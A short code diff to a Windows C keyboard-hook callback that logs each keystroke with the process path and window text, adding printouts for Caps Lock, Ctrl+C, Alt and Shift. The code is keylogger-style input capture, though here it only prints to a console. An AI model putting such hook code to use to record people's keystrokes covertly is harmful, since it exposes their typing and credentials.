@@ -56,7 +56,24 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 			GetModuleFileNameEx(handle,NULL,path,100);
 			printf("[%ld] %s %d,%s; %d,%s =>%x\n", pid,path,n,name,m,text,p->vkCode);
 		}
-		
+		if(GetAsyncKeyState(VK_CAPITAL))
+		{
+			printf("CapsLk\n");
+		}
+		if(p->vkCode==0x43 && GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_CONTROL) )
+		{
+			printf("Ctrl + c\n");
+		}
+		if(GetAsyncKeyState(VK_MENU))
+		{
+			printf("Alt\n");
+		}
+		if(GetAsyncKeyState(VK_SHIFT))
+		{
+			printf("Shift\n");
+		}
+		//GetKeyState
+		//GetAsyncKeyState
 	}
 /*
 	if (((w == WM_KEYDOWN) && ((GetKeyState(VK_CAPITAL) &1) || (GetKeyState(VK_SHIFT) &1))) 
